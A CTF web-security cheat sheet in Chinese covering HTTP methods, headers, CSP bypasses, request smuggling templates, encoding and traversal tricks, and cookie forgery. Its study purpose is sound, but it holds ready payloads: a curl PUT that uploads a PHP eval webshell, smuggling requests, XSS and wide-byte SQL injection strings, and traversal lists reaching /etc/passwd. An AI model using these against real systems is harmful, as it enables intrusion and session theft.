# basics|基础协议|📡
## [http] HTTP 协议基础——Web 题绕不开的协议细节：方法、状态码、头字段。
### [http-methods] HTTP 方法与常用场景 | easy | HTTP;请求方法;基础 | http方法;OPTIONS;TRACE
> HTTP 方法全表与 CTF 中的实际用途
## 方法速查

| 方法 | 语义 | CTF 用途 |
|---|---|---|
| `GET` | 获取资源 | 最常测（参数进 URL） |
| `POST` | 提交数据 | 登录、上传、注入主战场 |
| `PUT` | 上传替换资源 | **若开放可直接传马**（`curl -X PUT --data '<?php ...' http://t/shell.php`） |
| `DELETE` | 删除 | 少用 |
| `HEAD` | 只回响应头 | 探测文件存在（`curl -I`） |
| `OPTIONS` | 询问支持的方法 | 探测 `Allow: PUT` 等开放方法 |
| `TRACE` | 回显请求（调试） | XST：反射型 XSS 打到 HttpOnly Cookie |
| `PATCH` | 部分更新 | 配合 API 场景 |
| `CONNECT` | 隧道 | 代理场景 |

## 探测开放方法

```bash
curl -sI -X OPTIONS http://target/
# 响应 Allow: GET,HEAD,PUT,POST → PUT 可用

# 直接试 PUT 传马
curl -X PUT http://target/shell.php --data '<?php @eval($_POST["x"]);?>'
```

> [!danger] `TRACE` 开启且存在 XSS 时，可构造 XST 读取 HttpOnly Cookie（现代浏览器基本已限制，但服务端仍可回显）。
### [http-status] HTTP 状态码速查 | easy | HTTP;状态码;基础 | 状态码;404 403 302
> 必须记住的状态码及其隐藏含义
## 2xx 成功

| 码 | 含义 | 备注 |
|---|---|---|
| 200 | OK | 正常 |
| 201 | Created | POST/PUT 成功创建 |
| 204 | No Content | 成功但无响应体 |

## 3xx 重定向

| 码 | 含义 | 备注 |
|---|---|---|
| 301 | 永久跳转 | 抓包看 Location |
| 302 | 临时跳转 | **登录后跳转、SSRF 跟随** |
| 303 | See Other | 表单后跳转 |
| 304 | Not Modified | 缓存 |
| 307/308 | 保持方法重定向 | POST 重定向仍 POST（走私/SSRF 相关） |

## 4xx 客户端错误

| 码 | 含义 | 备注 |
|---|---|---|
| 400 | Bad Request | 参数错误/走私常见报错 |
| 401 | Unauthorized | 需认证（WWW-Authenticate） |
| 403 | Forbidden | **有资源但无权限**（有时路径存在） |
| 404 | Not Found | 不存在 |
| 405 | Method Not Allowed | 方法不支持（Allowed 头泄露） |
| 429 | Too Many Requests | 触发限频 |

## 5xx 服务端错误

| 码 | 含义 | 备注 |
|---|---|---|
| 500 | 内部错误 | 注入/序列化报错信号 |
| 502/504 | 网关错误 | 反代后端出错 |
| 505 | 版本不支持 | HTTP/0.9 等奇特请求 |

> [!tip] 三次访问同一路径 404，中间夹一次 `../admin` 返回 403 → 大概率是路径被规则拦截而非不存在，考虑编码绕过。
### [http-headers] HTTP 请求/响应头速查 | easy | HTTP;请求头;响应头 | 请求头;响应头;header注入
> 关键头字段意义与可利用点
## 请求头（Client → Server）

| 头 | 意义 | 可利用点 |
|---|---|---|
| `Host` | 虚拟主机名 | **Host 头注入**（密码重置、缓存投毒） |
| `Referer` | 来源页 | 防盗链绕过；CSRF |
| `User-Agent` | 客户端标识 | 日志投毒写马 |
| `X-Forwarded-For` / `X-Real-IP` | 真实 IP（反代） | **伪造 IP 绕过 IP 限制**：`X-Forwarded-For: 127.0.0.1` |
| `X-Original-URL` / `X-Rewrite-URL` | 内部路径 | **绕过前端路径鉴权**（访问 /admin 而让后端处理 /admin/real） |
| `X-Requested-With` | AJAX 标识 | 部分框架据此放行 |
| `Content-Type` | 请求体类型 | 伪造 `application/xml` 触发 XXE；`application/json` 触发 NoSQL |
| `Cookie` | 会话 | 改/伪造/过度 |
| `Authorization` | 认证 | Basic/JWT/Bearer 处理 |
| `Range` | 分段请求 | 绕过；配合特殊漏洞 |

## 响应头（Server → Client）

| 头 | 意义 | 注意 |
|---|---|---|
| `Server` | 服务器软件与版本 | 指纹，有时带 `(Ubuntu)` 等 |
| `X-Powered-By` | 语言框架 | `PHP/8.1`, `Express` 等 |
| `Set-Cookie` | 下发会话 | **看属性**（HttpOnly/SameSite） |
| `Location` | 跳转地址 | 开放重定向/走私反映 |
| `Content-Length` | 响应体长度 | **走私判据** |
| `Access-Control-Allow-Origin` | CORS 放行 | 反射 Origin = 配置错误 |
| `Strict-Transport-Security` | HSTS | 存在则不能明文降级 |
| `WWW-Authenticate` | 认证方式 | 401 时暴露 |

## 伪造 IP 通用头（多试几个）

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Forwarded: for=127.0.0.1
```

> [!info] 前端鉴权绕过三板斧：`X-Original-URL`、`X-Rewrite-URL`（改后端请求路径）；`X-Forwarded-Host` 篡改密码重置链接里的域名。
### [http-sec-headers] 安全响应头与 CSP | medium | HTTP;CSP;安全头 | CSP绕过;Content-Security-Policy;安全头检测
> CSP 与安全头的含义、影响 XSS 的方式
## 安全头清单

| 头 | 作用 | 缺失影响 |
|---|---|---|
| `Content-Security-Policy` | 限制可加载资源/脚本来源 | 无 CSP = XSS 更容易 |
| `X-Frame-Options: DENY/SAMEORIGIN` | 禁止 iframe 嵌入 | 缺失 = 点击劫持 |
| `HttpOnly`（Cookie 属性） | JS 不可读 cookie | 缺失 = 直接偷会话 |
| `SameSite`（Cookie 属性） | 限制跨站发送 | 缺失/None = CSRF 风险大 |
| `X-Content-Type-Options: nosniff` | 禁止 MIME 嗅探 | 缺失 = 上传 XSS 面 |
| `Referrer-Policy` | 控制 Referer 泄露 | 影响 token 泄露 |
| `Strict-Transport-Security` | 强制 HTTPS | - |

## CSP 常见策略与绕过

```
Content-Security-Policy: default-src 'self'          # 只允许同源
Content-Security-Policy: script-src 'self' 'unsafe-inline'
Content-Security-Policy: script-src 'unsafe-eval'    # 允许 eval（SSTI/动态代码面增大）
```

绕过思路：

| 防线 | 绕过 |
|---|---|
| `'unsafe-inline'` 在场 | 直接 `onerror=alert(1)` |
| 只禁 `default-src` | `script-src` 未定义时按 default 走，仍可找 `unsafe-inline` |
| 允许某域名 | 找该域名下的上传点/JSONP 作为落点 |
| 允许 `data:` | `<script src=data:text/javascript,alert(1)>` |
| 允许 `https:` | 找目标站 https 下的可控 JSONP |
| 允许 `*.example.com` | 找子域上传/反射点 |
| base-uri 未设置 | `document.baseURI` 投毒 + 相对路径引入恶意脚本 |

> [!tip] 拿到响应先看 `Content-Security-Policy` 是否存在、`unsafe-inline/unsafe-eval` 是否在场，直接决定 XSS payload 难度。
## [smuggling] 请求走私与协议攻击——前后端对 HTTP 解析不一致导致的协议层漏洞。
### [smug-basics] 请求走私原理速查 | hard | 请求走私;HTTP走私;协议攻击 | request smuggling;走私原理
> CL/TE 不一致引发的走私：成因、危害、T 型判定
## 原理

前端（代理/负载均衡）与后端（源站）对同一个请求的**边界判定不一致**，导致前端把「下一个请求」的一部分当成本请求内容，或反之。

核心两个头：

- `Content-Length`（CL）：按字节长度切分请求体
- `Transfer-Encoding`（TE）：按 chunk 块切分请求体

如果前端按 CL 解析、后端按 TE 解析（或反之），就出现**请求边界错位**。

## 危害

| 危害 | 说明 |
|---|---|
| 走私其他用户请求 | 打 CDN 缓存投毒 / 窃取他人请求（含会话） |
| 绕过 WAF 与前端鉴权 | 恶意请求被拆分进后端认为「合法」的请求 |
| 把请求拼到下一个用户 | 直接对下一位访问者投毒 |
| 内网转发数据 | CL.0 攻击发向后端集群 |

## 快速判断是否存在（T 型探测）

```http
POST / HTTP/1.1
Host: target
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

- 若下一个请求（`GET /admin`）被拼了进去 → 存在走私。
- **时间差法**：发送走私请求后紧接一个正常请求，观察响应时间暴涨（两个超时合并）即可能中招。

> [!danger] 走私探测本身可能把请求拼给其他用户 → 线下赛**只在靶场/自己的题目环境**测，切勿对真实服务乱打。
### [smug-clte] CL.TE / TE.CL / TE.TE 走私 | hard | 请求走私;CL.TE;TE.CL;payload | cl.te;te.cl;te.te;走私payload
> 三类走私的经典 payload 模板
## CL.TE（前端用 CL，后端用 TE）

```http
POST / HTTP/1.1
Host: target
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

前端按 CL=6 认为请求体 6 字节；后端按 TE（chunked），读到 `0` 视为请求结束，剩余 `X` 被当作**下一个请求的开头**。

经典利用：

```http
POST /search HTTP/1.1
Host: target
Content-Length: 150
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target
X: X
```

## TE.CL（前端用 TE，后端用 CL）

```http
POST / HTTP/1.1
Host: target
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

## TE.TE（两个都认 TE，但混淆其中一个）

```http
POST / HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: xchunked   # 第二个 TE 头让一端失效

0

GET /admin HTTP/1.1
Host: target
X: X
```

变体：`Transfer-Encoding : chunked`（加空格）、`Transfer-Encoding: chunked` + 制表符、`Transfer-Encoding: chunked, identity` 等。

## 实战姿势

```bash
# 带响应走私（获取 admin 页面）
curl -s -i http://target/ -H 'Content-Length: 150' -H 'Transfer-Encoding: chunked' --data-binary $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\nX: X\r\n\r\n'
```

> [!tip] 用 Burp 的 Turbo Intruder 或者 `http-request-smuggler` 扩展方便调试；线下做题多数情况直接给模板改路径即可。
### [h2-smuggling] HTTP/2 降级与走私变体 | hard | 请求走私;HTTP/2;协议攻击 | h2降级;h2c走私;http2走私
> HTTP/2 特有的走私与降级攻击
## 概念

HTTP/2 没有 CL/TE 头冲突（边界由帧定义），但由于**前端支持 h2、后端只支持 h1**，发生协议降级翻译时歧义依旧存在。

## H2.CL 走私（头部 CL 与帧长度冲突）

HTTP/2 请求里可以**携带 `content-length` 头**，而后端 h1 解析时用它作边界：

```
HTTP/2 伪头 + content-length: 5
帧体长度 6 字节
→ 前端按帧 6 字节转发，后端按 CL=5 截断，剩 1 字节成为下一个请求开头
```

## H2.TE 走私

HTTP/2 请求里带 `transfer-encoding: chunked` 头 → 后端 h1 按 chunked 解析产生歧义。

## H2 降级（Downgrade）攻击面

| 场景 | 手法 |
|---|---|
| 前端 h2 → 后端 h1 | 利用头命名混淆（`content-length` vs `Content-Length` 大小写重复） |
| 后端 h1 | 走私 payload 同 h1，但注意 h2 帧里 `\r\n` 会保留 |
| 请求拆分 | h2 的 `\r\n` 注入到头值（如 `x: a\r\nGET /admin`） |

> [!tip] 判断是否 h2：响应行变 `HTTP/2 200`；`curl --http2 -v` 查看。工具：Burp 的 HTTP/2 支持 + smuggle 扩展。线下赛 h2 走私题较少，但**H2 头注入（CRLF）**偶有出现。
## [encoding] 编码与解析差异——目录/参数/路径解析的编码绕过知识。
### [encoding-tricks] URL 编码与解析差异绕过 | medium | 编码;路径绕过;解析差异 | 双重编码;路径规范化;目录穿越编码
> 各种编码/规范化差异导致的 WAF 与路径绕过
## 常见编码形态

| 形态 | 示例 | 用途 |
|---|---|---|
| URL 编码 | `%2e%2e%2f` = `../` | 基本绕过 |
| 双重编码 | `%252e%252e%252f` | 后端解码两次时（如 Tomcat） |
| 三重编码 | `%25252e` | 三层解码链 |
| 大小写 hex | `%2E%2F` | 部分 WAF 只匹配小写 |
| 十六进制乱序 | `%c0%ae`（过宽字节） | 老 Apache/Tomcat 解析差异 |
| Unicode 兼容 | `%ef%bc%8f`（全角 /） | 仅特定栈 |
| 路径参数 | `/abc;../admin` | Servlet 解析差异 |
| 反斜杠 | `..\..\` | Windows/IIS 与部分反代 |

## 目录穿越编码变体

```
../           ..%2f        %2e%2e%2f
..%252f      %252e%252e%252f
..%c0%af     ..\         .%2e/
%2e%2e%5c    %u002e%u002e   (IIS)
....//       ....//....//   (过滤 . 后双写)
..././       ..;/          (路径参数)
```

> [!info] 实战优先顺序：`../` → `..%2f` → `..%252f` → `%2e%2e%2f` → `..\` → 双写 `....//`。配合 WAF 时逐个试。

## 路径规范化差异

| 栈 | 特点 |
|---|---|
| Nginx `alias` 拼接 | `location /files/ { alias /var/www/; }` → `/files/../etc/passwd` 直接穿越 |
| Nginx 畸形 URI | `/files../etc/passwd`（`merge_slashes` 归一化陷阱） |
| Tomcat | `;` 路径参数分隔，`/admin;.css` 绕过后缀 |
| IIS | `;` 截断执行（旧版） |
| Spring | `//`、`/..;/`、`%2e%2e` 均可规范化 |

> [!danger] 目录扫描 302/301 的实现经常忽略 `..` 变体；鉴权中间件与业务不一致是这类题的核心。
### [charset-issues] 字符集与编码陷阱 | medium | 编码;字符集;宽字节;UTF-7 | 宽字节注入;gbk;utf-7 xss;字符编码漏洞
> 宽字节注入、UTF-7 XSS 等字符集相关漏洞
## 宽字节注入（GBK 吃掉转义符）

原理：MySQL 连接字符集 GBK 时，`\` 的十六进制 `%5c` 与前一字节拼成宽字符，转义被「吃掉」。

```sql
-- 经典：输入 %df' 时
%df%27  →  GBK 解码把 %df%5c 拼成「運」字符 → 单引号逃逸
?id=1%df%27%20or%201=1--%20
```

> [!info] 现在主流是 UTF-8，宽字节题多为老站/模拟环境；修复方式为 `SET NAMES utf8` / `mysql_set_charset`。

## UTF-7 编码 XSS（历史老题）

浏览器按 `ISO-2022-JP`/`UTF-7` 解码时，`+ADw-script+AD4-` 会被解码成 `<script>`：

```
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

服务端只过滤了 ASCII 关键字，编码后绕过。现代浏览器已默认禁用 UTF-7，仅老题/旧环境。

## 字符规范化差异速查

| 场景 | 差异 | 利用 |
|---|---|---|
| 大小写 | `pHp` vs `php` | 绕过黑名单后缀/函数名 |
| 全角字符 | `／`（U+FF0F） | 部分 WAF 漏匹配 |
| 制表符/换行 | `%09`、`%0a` | 替代空格 |
| 空字节 | `%00` | 老 PHP 截断（已废弃） |
| Unicode 半角/全角 | `Ａ`（U+FF21） | 特定解析器混淆 |
| `UTF-16/32` BOM | 响应带 BOM | 老 IE 编码推断 |

> [!tip] 通用思路：先把字符串转成各种编码形态（url/hex/unicode/全角），逐个喂给目标看哪个「被原样透传」。
## [cookie] Cookie 与 Session——会话机制与伪造思路。
### [cookie-attrs] Cookie 属性速查 | easy | Cookie;会话;安全属性 | cookie属性;httponly;samesite
> Set-Cookie 各属性含义与安全影响
## Set-Cookie 属性

| 属性 | 含义 | 安全影响 |
|---|---|---|
| `HttpOnly` | JS 不可读 | 缺失 → XSS 直接偷会话 |
| `Secure` | 仅 HTTPS 发送 | 缺失 → 明文投递可被嗅探 |
| `SameSite=Lax/Strict/None` | 跨站请求携带策略 | Lax 以下 → CSRF 风险 |
| `Domain` | 作用域 | 宽泛 Domain 扩大面 |
| `Path` | 路径作用域 | 过宽同样危险 |
| `Expires/Max-Age` | 过期时间 | 长会话增加窗口 |

## SameSite 详解

| 值 | 跨站 GET | 跨站 POST | 场景 |
|---|---|---|---|
| `Strict` | ✗ | ✗ | 最安全 |
| `Lax` | ✓（顶层导航 GET） | ✗ | Chrome 默认 80+ |
| `None` | ✓ | ✓ | **必须配 Secure**；有则 CSRF 大 |
| 未设置 | 同 Lax（新浏览器） | ✗ | 旧浏览器为 None → 老题可 CSRF |

> [!info] 判断：`Set-Cookie` 里有没有 `SameSite=None`；有 → CSRF 打 POST 也带 Cookie。

## 利用要点

- **HttpOnly 缺失**：XSS 里 `document.cookie` 直接拿会话。
- **SameSite=None + Secure**：跨站表单也能带 Cookie → CSRF。
- 服务端读取 Cookie 时按**第一个/最后一个**同名字段处理的不一致也可利用（重复 Cookie 头）。
### [cookie-forgery] Cookie / Session 伪造与篡改 | medium | Cookie;会话伪造;序列化 | cookie伪造;session伪造;反序列化cookie
> 识别可预测/可篡改的会话凭据
## 先判断会话载体

| 载体 | 特征 | 攻击 |
|---|---|---|
| 明文可读 JSON/参数 | `{"user":"admin","role":1}` | 拆开看看是签名还是明文，**改字段重放** |
| 签名 JSON（JWT 或自定义 HMAC） | `xxx.yyy.zzz` | 试 `none` 算法、弱密钥爆破 |
| 串行化二进制 | PHP `O:4:"User"...` | PHP 反序列化/对象注入 |
| 32/64 位 hex | MD5/sha 摘要 | 尝试弱口令对应值 / 爆破 |
| 自增/时间戳 | 可预测 | 越权遍历合法会话 ID |
| `PHPSESSID` 随机串 | 服务端存储 | 弱随机/固定攻击 |

## 常见篡改姿势

1. **明文参数直接改**：
```
Cookie: user=admin; role=admin; isvip=1; login=1
Cookie: user=1        → 改成 user=0 试管理员
Cookie: id=13         → 遍历 id
```

2. **序列化对象**（PHP）：
```
Cookie: auth=O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
```

3. **加盐签名**：收集多组明文+签名，尝试猜盐/爆破（弱秘密）。

> [!danger] 大量后端只是 `base64(json)` 不做完整性校验 —— base64 解出来就能改。看到「读起来像 JSON 的乱码」，先 `base64 -d`。

## Session 固定 / 可预测

- 登录前后 `PHPSESSID` 不变 → 可先拿到受害者 session，诱导其登录后复用。
- 弱随机 session：`session_id` 由时间戳/简单拼接构成 → 预测下一个。
## [traffic] 抓包与代理——把流量导进代理的三种方式（线下赛必备）。
### [capture-basics] 抓包代理设置（Burp / mitmproxy） | easy | 抓包;Burp;mitmproxy;代理 | burp代理;mitmproxy;127.0.0.1:8080;抓包设置
> 浏览器/命令行到代理的流量转发配置
## Burp（默认监听 127.0.0.1:8080）

- 浏览器：Proxy → 手动配置 HTTP 代理 `127.0.0.1:8080`
- HTTPS 需装 Burp 证书（Proxy → Options → Import CA cert）
- 命令行工具：

```bash
# curl 走代理
curl -x http://127.0.0.1:8080 http://target/
curl --proxy http://127.0.0.1:8080 -k https://target/

# python requests 走代理
# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
```

## mitmproxy（命令行更友好）

```bash
mitmproxy -p 8080          # 交互界面
mitmdump -p 8080           # 只打印流量

# 配合命令行：
curl -x http://127.0.0.1:8080 ...
```

## 无代理工具只靠命令行（题目标签快速复用）

```bash
# 直接打原始请求（用 -i 看响应头，-b 带 cookie，-d 带 POST 体）
curl -s -i 'http://target/login.php' -d 'user=admin&pass=123'
curl -s 'http://target/a.php' -b 'session=abc' -H 'Cookie: x=1'

# Burp 导出的请求直接喂给 curl：
curl -s -i -X 'POST' 'http://target/' -H 'Cookie: ...' --data-binary 'a=1'
```

## 浏览器 DevTools 直改请求

- F12 → Network → 右键请求 → Edit and resend（Chrome 新版本）
- F12 → Console 执行 `fetch(url, {method:'POST', body: ...})`

> [!tip] 线下赛建议：Burp 全流量走代理 + `Logger++` 留痕；重放类题目用 Repeater 或直接命令行 curl 循环。
